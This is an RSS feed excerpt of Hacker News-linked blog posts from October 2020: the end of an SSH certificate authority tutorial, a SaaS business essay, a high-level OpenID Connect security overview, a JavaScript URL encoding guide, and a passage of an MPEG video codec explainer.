</code></pre><ol start="2"><li>Copy certifcate to the client under <code>&lt;userhome&gt;/.ssh</code></li><li>Copy CA Host Public Key (<code>ca_host_key.pub</code>) to the client and put it either in known_hosts file under <code>&lt;userhome&gt;/.ssh</code> (local) or <code>/etc/known_hosts</code> (global) file in the following format:</li></ol><pre><code>@cert-authority *.dbsentry.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDN4F3JKuAS1V0nQmBRNl5fS8dZS49FKUp5wwy8R0wDcNYdrq+M5/tdS6K/R07445VWpVKwExZGboaQ/YR5iQ392YHM55ThMjSP5CTywmiP033MX3zG5eO9Iec5fz/hHtwrDtxb4Xm3FfGhXjjKTozNf/uMcOjIM1STr/I6t2zfZ42bnCq4DFj1GWHSrOtnxjN0PPOfCLH+1AmKhEUFqf0NBD3CQoPamaRVf4ouAc9KxOLFge+gebJe9jmqkaVHYfZD2CPoLVGHXZCphSQ3gyEKpvgD8VnfU9/la6BNtcK9lSONZWLFcw523HdlnbGVz+t15zZAXLu/3H6yK5SPC/L 
</code></pre><p>Above instructs SSH client to trust host certificate signed by the CA.
4. Test ssh. You should not receive TOFU warning and should not be asked for the password either. The generated certificate should work for the principals (i.e. users on server) for the validity period.</p><h2 id="summation">Summation</h2><p>In this article, I have demonstrated setup of SSH Certifciate Authority and why and how SSH authentication use SSH certificates.</p><p><code>&lt;Shameless-Plug&gt;</code><br>Although the use of certificates results in more secure SSH authentication, SSH CA adds the burden of ssh certificate management. To ease that burden one can use a centralized system such as
<a href="https://keyper.dbsentry.com/" target="_blank" rel="noopener">Keyper</a>. Keyper is an Open Source SSH Key and Certificate-Based Authentication Manager. Keyper acts as an SSH Certificate Authority (CA) and it standardizes and centralizes the storage of SSH public keys and SSH Certificates for all Linux users in your organization saving significant time and effort it takes to manage SSH public keys and certificates on each Linux Server. Keyper also maintains an active Key Revocation List, which prevents the use of Key/Cert once revoked. Keyper is a lightweight container taking less than 100MB. It is launched either using Docker or Podman. You can be up and running within minutes instead of days.<br><code>&lt;/Shameless-Plug&gt;</code></p><p>Thats it folks! Happy more secure SSH‚Äôing.</p></div></div>]]>
            </description>
            <link>https://keyper.dbsentry.com/post/sshca/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948738</guid>
            <pubDate>Sat, 31 Oct 2020 02:41:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS vs. Subscription]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948666">thread link</a>) | @Lukas1994
<br/>
October 30, 2020 | https://www.causal.app/blog/saas-vs-subscription | <a href="https://web.archive.org/web/*/https://www.causal.app/blog/saas-vs-subscription">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a></p><p>The three key characteristics of a SaaS company are: subscription, high margin, and scalability. There are so many new business models and new applications of existing business models into new markets that capture one or two of these, but in order to get the high multiples that SaaS companies achieve, it's critical to have all three. In addition, the "rule of thumb" metrics that I previously mentioned don't work so well in the absence of any of these characteristics. While the fundamental subscription math remains true, you have to dig much deeper to understand the impact on the cash flows, working capital needs, scalability, customer lifetime value and long term profitability to be able to assess the health and viability of a business.</p><p>For example, if we look at <a href="https://www.lemonade.com/">Lemonade</a>, which priced its IPO today (<a href="https://www.sec.gov/Archives/edgar/data/1691421/000104746920003943/a2242013z424b4.htm">424B4 here</a>). Lemonade is a technology-enabled insurance company and insurance broker. I think most people would agree that it is not a software company. But if we look through the lens of these three characteristics and some of the key metrics, we can learn a lot about its long term prospects as a business.</p><ol role="list"><li><strong>Subscription:</strong> Insurance is probably one of the original subscription businesses, with people paying annual or monthly premiums. Revenue comes in regularly to support the clients‚Äô claims.</li><li><strong>Scalability:</strong> Assuming there's access to re-insurance and the capital to back up the insurance plans, this business is highly scalable and in a huge market.</li><li><strong>Margins:</strong> This is where it gets a bit more complicated. This is not a 90% margin, AWS-expense only business. It's a complicated financial cycle and risk assessment business with very different capital, accounting and cash flow dynamics. Lemonade runs a few different businesses with varying risk ownership which have an impact on gross profit, and overall they achieved a gross margin of 17% in 2019.</li></ol><p>Now let's take a look at some of the key metrics:</p><ol role="list"><li><strong>LTV</strong>: In most software businesses, especially those either creating or selling into new markets, it's almost impossible to calculate a lifetime value because we don't have enough data on the lifetime of a customer. In the insurance business, there's tons of data going back decades for hundreds of millions of people. Insurance companies run on actuarial science, which one could argue is the original data science application. To put it lightly, they understand data and have lots of it. While in a new-fangled enterprise or consumer software business, lifetime value is a shot in the dark, in the insurance business it's not, where it's reasonable to expect your customers to stay with you for 25+ years.</li><li><strong>CAC Payback</strong>: Knowing you can keep your customers for a very long time is great and now you can calculate the CAC you can afford to invest in order to acquire them. Lemonade runs efficiently now with $1 of marketing to $2 of in-force premium on their platform. Gross margin-adjusted this obviously shifts the timeline out, but that's OK because the likelihood of keeping the customers for a long time is high. This introduces a new question: capital. With short paybacks, cash management isn't so much of a challenge, but as those payback times increase, so does the need to fund the working capital needs of the business. The time value of money becomes a factor here, but is manageable and calculable.</li></ol><p>So a quick look through the lens of the fundamental subscription concepts makes it clear that even though Lemonade is not a software business, it is a subscription business with some highly favorable business and customer economics.</p><p>And congrats to the Lemonade team on the IPO!</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f6128d02bc85546e3a93976_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Faa34c7a7-d833-453f-a3cb-79b88beb7eda_1536x1025.jpeg" alt=""></p></figure><p>‚Äç</p></div></div>]]>
            </description>
            <link>https://www.causal.app/blog/saas-vs-subscription</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948666</guid>
            <pubDate>Sat, 31 Oct 2020 02:24:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Real-life OIDC Security (I): Overview]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948626">thread link</a>) | @mooreds
<br/>
October 30, 2020 | https://security.lauritz-holtmann.de/post/sso-security-overview/ | <a href="https://web.archive.org/web/*/https://security.lauritz-holtmann.de/post/sso-security-overview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
      
  
  <article>

    <header>
      <p>
          
        POSTS
      </p>
      
      
      <time datetime="2020-10-30T18:21:19+02:00">October 30, 2020</time>      
      
      
    </header>

    <section><p>This is the <em>first</em> post of a series on Single Sign-On and OpenID Connect 1.0 security. This post presents a high-level overview of observed issue patterns during my research on real-life OIDC security and proposes additions to the specification‚Äôs security considerations.</p>
<p>The series will approximately consist of the following posts:</p>
<ol>
<li><a href="https://security.lauritz-holtmann.de/post/sso-security-overview/">[Overview] <strong>Common Issue Patterns and Derived Security Considerations</strong></a></li>
<li><a href="#">[Implementation] Login Confusion</a> (2020-11-03)</li>
<li><a href="#">[Implementation] Injection of CRLF sequences</a> <em>(2020-11-05)</em></li>
<li><a href="#">[Implementation] SSRF issues in real-life OIDC implementations</a>  <em>(2020-11-10)</em></li>
<li><a href="#">[Specification] Redirect URI Schemes</a>  <em>(2020-11-12)</em></li>
<li><a href="#">[Specification] Reusable State parameter</a>  <em>(2020-11-17)</em></li>
<li><a href="#">[Responsible Disclosure] Lessons learned during Responsible Disclosure of OIDC/OAuth related issues</a>  <em>(2020-11-19)</em></li>
</ol>
<p>As you can see, the series is structured in an <em>[Overview]</em>, attacks with concrete examples categorized as <em>[Implementation]</em> flaws and <em>[Specification]</em> flaws, and finally lessons learned during the <em>[Responsible Disclosure]</em>.  <br>
Note that <em>this</em> post describes the overall patterns and considerations derived during my research. The following posts in this series will give detailed examples of vulnerabilities that were found in real-life OpenID Connect implementations.</p>
<blockquote>
<h3 id="acknowledgment">Acknowledgment</h3>
<p>We made the observations within this advisory during the research for my master‚Äôs thesis on ‚Äú<em>Single Sign-On Security: Security Analysis of real-life OpenID Connect Implementations</em>‚Äù. The thesis was written at the <a href="https://www.nds.ruhr-uni-bochum.de/chair/news/">chair for network and data security</a> of <a href="https://www.ruhr-uni-bochum.de/">Ruhr University Bochum</a>.</p>
<p>The advisors of my thesis are <a href="https://twitter.com/CheariX">Dr.-Ing. Christian Mainka (@CheariX)</a>, <a href="https://twitter.com/v_mladenov">Dr.-Ing. Vladislav Mladenov (@v_mladenov)</a> and <a href="https://twitter.com/JoergSchwenk">Prof. Dr. J√∂rg Schwenk (@JoergSchwenk)</a>. Huge ‚ÄúThank you‚Äù for your continuous support! üôÇ</p>
</blockquote>
<h2 id="introduction">Introduction</h2>
<p>This post outlines the lessons learned during the research on the security of real-life OpenID Connect implementations.
We presume basic knowledge of OpenID Connect 1.0 and OAuth 2.0 for this post.</p>
<p>First, we outline a high-level overview of the selection criteria. Afterward, we describe patterns that were regularly observed during the analysis of real-life OpenID Connect Service Provider and Identity Provider implementations.
Finally, proposals for adjusted security considerations regarding the OpenID Connect specification are derived.</p>
<h2 id="high-level-setup-and-selection-of-implementations">High-Level Setup and Selection of Implementations</h2>
<p>During the analysis, we evaluated OIDC Identity Provider and Service Provider implementations regarding a defined set of assertions, based on the specification‚Äôs security considerations [2, Section 16][3] and the OAuth 2.0 Security Best Current Practices [1]. In doing so, we analyzed self-hosted software <em>and</em> hosted services. For Service Providers, we considered the ability to configure custom Identity Providers as mandatory.</p>
<p>The following software and services were analyzed:</p>
<ul>
<li><a href="https://www.keycloak.org/">Keycloak (Red Hat)</a></li>
<li><a href="https://www.atlassian.com/software/bitbucket">Bitbucket Server (Atlassian)</a></li>
<li><a href="https://about.gitlab.com/">GitLab</a></li>
<li><a href="https://www.salesforce.com/">Salesforce Lightning</a></li>
<li><a href="https://aws.amazon.com/cognito/">Amazon Cognito (AWS)</a></li>
</ul>
<h2 id="derived-issue-patterns">Derived Issue Patterns</h2>
<p>In the following, we outline <em>seven</em> issue patterns that we derived within our test-set.  <br>
<em>Reminder: This post aims to give an overview. We discuss novel patterns and the most relevant observations in detail in dedicated posts.</em></p>
<h3 id="pattern-1-redirect-uri-schemes">Pattern 1: Redirect URI Schemes</h3>
<p>The OpenID Connect Core specification is quite vague regarding allowed schemes for <code>redirect_uri</code> values, see [2, Section 3.1.2.1]:</p>
<blockquote>
<p>REQUIRED. Redirection URI to which the response will be sent. This URI MUST exactly match one of the Redirection URI values for the Client pre-registered at the OpenID Provider, with the matching performed as described in Section 6.2.1 of [RFC3986] (Simple String Comparison). When using this flow, the Redirection URI <strong>SHOULD use the https scheme</strong>; however, <strong>it MAY use the http scheme</strong>, provided that the Client Type is confidential, as defined in Section 2.1 of OAuth 2.0, and provided the OP allows the use of http Redirection URIs in this case. The Redirection URI <strong>MAY use an alternate scheme</strong>, such as one that is intended to identify a callback into a native application.</p>
</blockquote>
<p>We observed that multiple Identity Providers support pre-registering <code>redirect_uri</code> values with any possible scheme. Such schemes' support is potentially dangerous, as browsers treat risky schemes like <em>data</em> or <em>javascript</em> very differently (some of my test cases can be found <a href="https://security.lauritz-holtmann.de/files/evaluation_results.xlsx">here</a>, recently <em>quinn</em> found an interesting vector for Firefox using the <a href="https://www.gremwell.com/firefox-xss-302"><em>ws</em> scheme</a>).  <br>
Additionally, the specification defined the <code>redirect_uri</code> vague because it had native clients in mind. There are very few legitimate use-cases for these schemes as <code>redirect_uri</code> values in OpenID Connect setups.</p>
<h3 id="pattern-2-server-side-request-forgery">Pattern 2: Server-Side-Request-Forgery</h3>
<p>Multiple Identity and Service Provider implementations were vulnerable to different types of Server-Side Request Forgery (SSRF) vulnerabilities.
The Identity Provider‚Äôs <code>request_uri</code> parameter is already known to be vulnerable for SSRF by design since 2017 [4, Section III;A. 8)]. Notably, this vulnerability could be exploited by any unauthenticated user.</p>
<p>In 2017, Mladenov and Mainka pointed out [5, Section 2.1.2] that a malicious <em>Discovery Service</em> could be used to launch a SSRF attack against a Service Provider. Thus, the attacker can use SSRF for port scans or for retrieving data.
Additionally, having access to the endpoint configuration, administrative users could launch SSRF attacks on the Service Provider by design. Depending on the actual setup, this yields to severe security implications, especially considering hosted and <em>cloud</em> services.</p>
<p>Even though these issues were theoretically discussed earlier, SSRF to <em>private IPs</em> or <em>localhost</em> was a common and serious issue among our test-set.</p>
<h3 id="pattern-3-tls-enforcement">Pattern 3: TLS Enforcement</h3>
<p>The OpenID Connect Core specification already enforces TLS for communication with <em>Authentication</em>, <em>Token</em>, and <em>UserInfo Endpoint</em>, so does the OpenID Connect Dynamic Client Registration regarding the <em>Client Configuration Endpoint</em>. Nevertheless, most of the analyzed implementations allowed performing the discovery using unencrypted communication or allowed to specify OpenID Connect endpoints using HTTP without TLS.</p>
<h3 id="pattern-4-leakage-via-error-pages">Pattern 4: Leakage via Error Pages</h3>
<p>Error messages and pages need extra attention. We discovered that multiple Service Provider implementations presented error pages as a direct response to  <em>Authentication Responses</em> [2, Section 3.1.2.5.]. As a result, this page‚Äôs GET parameters include OpenID Connect values like <code>state</code> and <code>code</code>.  External resources like images, scripts, styles, or links to external resources on can be on any endpoint. In these cases, the attacker can retrieve sensitive information, including OpenID Connect parameters, in query parameters or the <code>Referer header</code>. <!-- raw HTML omitted --></p>
<h3 id="pattern-5-csrf">Pattern 5: CSRF</h3>
<p>The Service Provider‚Äôs <em>Initiate Login Endpoint</em> implements Login Cross-Site-Request-Forgery (CSRF) by design and per specification [2, Section 4.]. This behavior is well known and was previously discussed [4, Section III; A. 7)].
Besides this endpoint, we observed non-normative endpoints that start an external OpenID Connect login without CSRF protection as well. If the <code>state</code> is correctly validated, these endpoints still allow to log in a victim End-User into her own account ("<em>Login CSRF</em>").</p>
<p>If there are additional non-normative parameters that indicate where the End-User should be redirected to after successful authentication (i.e., ‚Äúnext‚Äù, ‚ÄúnextUrl‚Äù, ‚Ä¶) and these parameters allow specifying the
<em>Login Initiation Endpoint</em> or non-normative endpoints that start external OIDC login flows, <strong>Login Confusion attacks</strong> are possible. Technical details for this novel attack will be given in the next post of this series.</p>
<h3 id="pattern-6-state-parameter-handling">Pattern 6: State parameter handling</h3>
<p>OpenID Connect <code>state</code> parameter handling at the Service Provider‚Äôs <em>Redirection Endpoint</em> showed multiple more common issues. Some of the analyzed implementations did not handle the unexpected behavior of not receiving a <code>state</code> within the <em>Authentication Response</em> if it was present within the <em>Authentication Request</em>. As a result, unhandled exceptions occurred. Depending on the actual implementation, this may lead to sensitive information disclosure or availability issues.
Further, multiple implementations correctly bound the <code>state</code> to the user session. Still, they failed to make it one-time-usable, increasing the attack surface for token-reuse and Denial-of-Service Amplification attacks (we give the technical details behind this attack in a future blog post).</p>
<h3 id="pattern-7-injection-of-metacharacters">Pattern 7: Injection of Metacharacters</h3>
<p>Service Providers often treat contents provided by Identity Providers as trustworthy. In our research, we show that this behavior in general yields injection issues (previously outlined as ‚ÄúInjection Attacks‚Äù by Mainka et al. in [5, Section 2.1.3]).
Striking among the test-set were <em>CRLF</em>-related issues, as missing sanitization can lead to HTTP header injections in Service Provider initiated requests and injections to application log files.</p>
<h2 id="derived-openid-connect-security-considerations">Derived OpenID Connect Security Considerations</h2>
<p>In addition to previously known security considerations [1][2, Section 16.][5], it has been shown that the following aspects need extra attention. Some of these considerations have been made earlier but with a less severe indication. In terms of RFCs and specifications, this would mean that a ‚ÄúMAY‚Äù or ‚ÄúSHOULD‚Äù would become a ‚ÄúMUST‚Äù.</p>
<ol>
<li>The specification needs to be tightened regarding the <code>redirect_uri</code> definition. This URI scheme should NOT be <em>data</em>, <em>javascript</em>, <em>vbscript</em>, or any other scheme that is not <em>HTTP(S)</em> or related to a dedicated native client.</li>
<li>The Identity Provider SHOULD restrict allowed <code>request_uri</code> values by allowing the Service Provider to specify the <code>request_uris</code> parameter that is an ‚Äú[‚Ä¶] array of request_uri values [‚Ä¶]‚Äù, at registration [6, Section 2.].
Currently, only if the OpenID Connect Dynamic Client Registration is used, the Identity Provider can require the Service Provider to ‚Äú[‚Ä¶] pre-register <code>request_uri</code> values using the <code>request_u‚Ä¶</code></li></ol></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://security.lauritz-holtmann.de/post/sso-security-overview/">https://security.lauritz-holtmann.de/post/sso-security-overview/</a></em></p>]]>
            </description>
            <link>https://security.lauritz-holtmann.de/post/sso-security-overview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948626</guid>
            <pubDate>Sat, 31 Oct 2020 02:13:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to encode and decode URL with JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948588">thread link</a>) | @phongduong
<br/>
October 30, 2020 | https://phongduong.dev/blog/how-to-encode-and-decode-url-with-javascript/ | <a href="https://web.archive.org/web/*/https://phongduong.dev/blog/how-to-encode-and-decode-url-with-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When you request a third-party API, you may pass parameters that contain special characters. This may cause errors for your request. To avoid this situation, you need to encode the URL before sending the request. </p>
<h2 id="encode-url">Encode URL</h2>
<p>Javascript has 2 functions that help you encode a URL:</p>
<ul>
<li><code>encodeURI()</code>: encode a full URL. It doesn't encode <code>~!@#$&amp;*()=:/,;?+'</code> </li>
<li><code>encodeURIComponent()</code>: encode a part of the URL. It doesn't encode <code>-_.!~*'()</code> </li>
</ul>
<h2 id="examples">Examples</h2>
<h3 id="encode-url-1">Encode URL</h3>
<pre><code><span>const</span> <span>URL</span> <span>=</span> <span>"https://phongduong.dev/blog/ki·ªÉm tra ti·∫øng Vi·ªát"</span>

<span>console</span><span>.</span><span>log</span><span>(</span><span>encodeURI</span><span>(</span><span>URL</span><span>)</span><span>)</span> 
<span>console</span><span>.</span><span>log</span><span>(</span><span>encodeURIComponent</span><span>(</span><span>URL</span><span>)</span><span>)</span> </code></pre>
<h3 id="encode-parameters">Encode parameters</h3>
<pre><code><span>const</span> <span>URL</span> <span>=</span> <span>"https://phongduong.dev"</span>
<span>const</span> <span>URLParam</span> <span>=</span> <span>"https://example.com"</span>
<span>const</span> queryParam <span>=</span> <span>"ƒê√¢y l√† ti·∫øng Vi·ªát"</span>

<span>console</span><span>.</span><span>log</span><span>(</span><span><span>`</span><span><span>${</span><span>URL</span><span>}</span></span><span>?url=</span><span><span>${</span><span>encodeURIComponent</span><span>(</span><span>URLParam</span><span>)</span><span>}</span></span><span>`</span></span><span>)</span> 
<span>console</span><span>.</span><span>log</span><span>(</span><span><span>`</span><span><span>${</span><span>URL</span><span>}</span></span><span>?q=</span><span><span>${</span><span>encodeURIComponent</span><span>(</span>queryParam<span>)</span><span>}</span></span><span>`</span></span><span>)</span> </code></pre>
<h2 id="decode-url">Decode URL</h2>
<p>Javascript provides <code>decodeURI()</code> and <code>decodeURIComponent()</code>to decode a URL. You can use them to decode the corresponding encoding function's result</p>
<pre><code><span>console</span><span>.</span><span>log</span><span>(</span><span>decodeURI</span><span>(</span><span>"https://phongduong.dev/blog/ki%E1%BB%83m%20tra%20ti%E1%BA%BFng%20Vi%E1%BB%87t"</span><span>)</span><span>)</span> 
<span>console</span><span>.</span><span>log</span><span>(</span><span>decodeURIComponent</span><span>(</span><span>"https%3A%2F%2Fphongduong.dev%2Fblog%2Fki%E1%BB%83m%20tra%20ti%E1%BA%BFng%20Vi%E1%BB%87t"</span><span>)</span><span>)</span> </code></pre>
<h2 id="summary">Summary</h2>
<p>If you want to encode a full URL, use <code>encodeURI()</code>. </p>
<p>If you want to encode a part of the URL, use <code>encodeURIComponent()</code>. </p>
<p>To decode, use the corresponding function.</p>
</div></div>]]>
            </description>
            <link>https://phongduong.dev/blog/how-to-encode-and-decode-url-with-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948588</guid>
            <pubDate>Sat, 31 Oct 2020 02:05:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[VVC, EVC, LCEVC ‚Äì MPEG's New Video Codecs ‚Äì Explainer with Lcevc Results Linked]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948460">thread link</a>) | @ponderingfish
<br/>
October 30, 2020 | https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/ | <a href="https://web.archive.org/web/*/https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-vvc-lcevc-min.png?resize=678%2C381&amp;ssl=1" alt="vvc evc lcevc mpeg" title="evc-vvc-lcevc-min" data-src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-vvc-lcevc-min.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p><strong>MPEG is releasing three new video codecs in 2020-2021 called Versatile Video Coding (H.266), Essential Video Coding (EVC MPEG-5 Part 1), and Low Complexity Enhancement Video Coding (LCEVC MPEG-5 Part 2). Let‚Äôs take a look at the highlights of each of these codecs and what they bring to the table.</strong></p>




<h2 id="video-compression-is-critical-to-your-infrastructure"><span id="Video_Compression_is_Critical_To_Your_Infrastructure"></span>Video Compression is Critical To Your Infrastructure<span></span></h2>



<p>Video traffic is growing by the day and that is not going to stop any time soon. The pandemic might have stymied other industries, but, has actually given a filip to the streaming industry, because people are stuck indoors, and watching videos provides a much-needed escape from the daily routine!</p>



<p>Video Compression is a critical component in the video delivery pipeline and can make a massive make-or-break impression in the minds of the end-user. If you ‚Äútune‚Äù your encoders to maximize video quality, you‚Äôll have to compromise on compression efficiency and spend more bits; and vice-versa. If you compromise on compression efficiency and create larger files, then you will have to spend more on CDN delivery costs.</p>



<p>So, the goal of every encoder team is to create a fine-balance between quality and bitrate. In other words, balance video quality with dollars.</p>



<p>The easiest way to perform this balancing act is to upgrade to the best encoder or encoding technology on the market. Hypothetically, this is simple, but practically, this is difficult. You need to make sure that the quality-complexity-efficiency trade-offs are met and decoder support is available amongst other things.</p>



<h2 id="the-failure-of-hevc"><span id="The_Failure_of_HEVC"></span>The Failure of HEVC<span></span></h2>



<p>When we talk about encoders, the discussion isn‚Äôt complete without mentioning H.264/AVC which is still ruling supreme since its introduction by MPEG (in 2003, I think). The MPEG announced a successor to H.264/AVC and called it H.265/HEVC (High Efficiency Video Coding) that had a slew of new coding tools such as quadtree decomposition, new picture types, SAO filtering, etc.</p>



<p>However, HEVC turned out to be a flop and the failure of HEVC had almost nothing to do with the algorithms. For HEVC R&amp;D teams, getting 20-30% gains over AVC was easy. </p>



<p><strong>You may disagree, but, as someone who wrote HEVC code for years, I stand by what I said.</strong></p>



<p>The ‚Äúfailure‚Äù of MPEG‚Äôs H.265/HEVC was due to patent-pools and licensing issues and this created the need for a new codec to fill the gap left by HEVC and to replace H.264/AVC (which by-design will struggle to compress 4K, UHD, and large resolutions).</p>



<p>In this regards, MPEG has announced that three new video codecs will soon be standardized and they are :-</p>



<ul><li>Versatile Video Coding (H.266)</li><li>Essential Video Coding (EVC MPEG-5 Part 1)</li><li>Low Complexity Enhancement Video Coding (LCEVC MPEG-5 Part 2)</li></ul>



<p>Let‚Äôs take a quick look at the objective of each of these codecs and see what gap they‚Äôre trying to plug, shall we?</p>



<h2 id="versatile-video-coding---vvc--h266"><span id="Versatile_Video_Coding_%E2%80%93_VVC_/_H_266"></span>Versatile Video Coding ‚Äì VVC / H.266<span></span></h2>



<figure><img data-attachment-id="113" data-permalink="https://ottverse.com/h266_vvc/" data-orig-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?fit=1920%2C1080&amp;ssl=1" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h266_vvc" data-image-description="" data-medium-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="versatile video coding vvc h266" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1024%2C576&amp;ssl=1 1024w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=300%2C169&amp;ssl=1 300w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=768%2C432&amp;ssl=1 768w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1536%2C864&amp;ssl=1 1536w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1200%2C675&amp;ssl=1 1200w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1568%2C882&amp;ssl=1 1568w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?w=1920&amp;ssl=1 1920w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Touted as a successor to HEVC, the Versatile Video Coding standard has a lofty goal of achieving at least a 30% improvement in compression efficiency over HEVC. This should be doable considering the allowance of the ‚Äú10x complexity increase‚Äù that the committee has provided.</p>



<p>In&nbsp;<a href="https://mpeg.chiariglione.org/sites/default/files/files/standards/parts/docs/w17074.zip" target="_blank" rel="noopener">the MPEG Requirements document</a>&nbsp;for VVC (H.266), a few interesting points stand out with regards to compression efficiency, coding complexity, etc.</p>



<ul><li><strong>A substantial improvement in compression efficiency compared to HEVC Main Profile is required for the target application(s);</strong>&nbsp;at no point of the entire bit rate range shall it be worse than existing standard(s).&nbsp;<strong>30% bitrate reduction for the same perceptual quality is sufficient for some important use-cases and may justify a future video coding standard</strong>. Other use-cases may require higher bit-rate reductions such as 50%.</li><li><strong>Encoding complexity of approximately 10 times or more than that of HEVC</strong>&nbsp;is acceptable for many applications.</li><li><strong>The standard shall enable the use of efficient prediction structures (e.g. so-called open groups of pictures) without compromising from the fast and seamless representation switching capability between representations of different properties, such as different spatial resolutions.</strong></li><li>Support for&nbsp;<strong>progressive scanning shall be required for all Profiles and Levels</strong>.</li></ul>



<p>What stands out to me the most in the Requirements document are the references to ‚Äú<strong>fast-switching</strong>‚Äù and ‚Äú<strong>progressive scanning</strong>‚Äú. This is a clear indication of the importance that the MPEG body is placing on OTT streaming&nbsp;<em>(and the implicit absence of interlaced video in OTT)</em>.</p>



<p>This was a HUGE problem in HEVC where interlaced support was an after-thought; and it lead to a lot of code-wrangling to retro-fit interlaced support into commercial codecs. I hope VVC does not tread the same interlaced path.</p>



<p>The second comment about fast-switching is interesting and might put pressure on codec vendors to insert more IDRs in the bitstream to support smaller segment sizes and clean, fast, switching between profiles in the ABR bitrate ladder. The reference to open-gops is interesting, because Open-GOPs are very helpful in increasing compression efficiency ‚Äì so this is something fun to watch out for.</p>



<p>Whenever a discussion about MPEG‚Äôs video codecs comes up, the elephant in the room has to be&nbsp;<strong>licensing</strong>. Fraunhofer HHI said in their&nbsp;<a href="https://newsletter.fraunhofer.de/-viewonline2/17386/465/11/14SHcBTt/V44RELLZBp/1" target="_blank" rel="noopener">newsletter</a>&nbsp;that,</p>



<blockquote><p>A uniform and transparent licensing model based on the FRAND principle (i.e., fair, reasonable, and non-discriminatory) is planned to be established for the use of standard essential patents related to H.266/VVC. For this purpose, the Media Coding Industry Forum (MC-IF) was founded.</p></blockquote>



<p>I hope VVC pans out because I‚Äôd love to see it in action crunching 4K/8K videos!</p>



<p><strong>Read <a href="https://ottverse.com/x266-vvc-multicoreware-opensource-encoder/">OTTVerse‚Äôs update of MulticoreWare‚Äôs x266 encoder for VVC.</a></strong></p>



<p><strong>Reference</strong>&nbsp;‚Äì&nbsp;<a href="https://mpeg.chiariglione.org/standards/exploration/future-video-coding/requirements-a-future-video-coding-standard-v5" target="_blank" rel="noopener">Requirements for a Future Video Coding Standard V5</a></p>



<h2 id="essential-video-coding---evc-mpeg-5-part-1"><span id="Essential_Video_Coding_%E2%80%93_EVC_(MPEG5_Part_1)"></span>Essential Video Coding ‚Äì EVC (MPEG-5 Part 1)<span></span></h2>



<p>MPEG-5 EVC or Essential Video Coding is an MPEG standard backed by Samsung, Huawei, Qualcomm, Divideon as a response to the patent pool mess that HEVC ran it that essentially stymied large-scale adoption of a powerful video compression standard.</p>



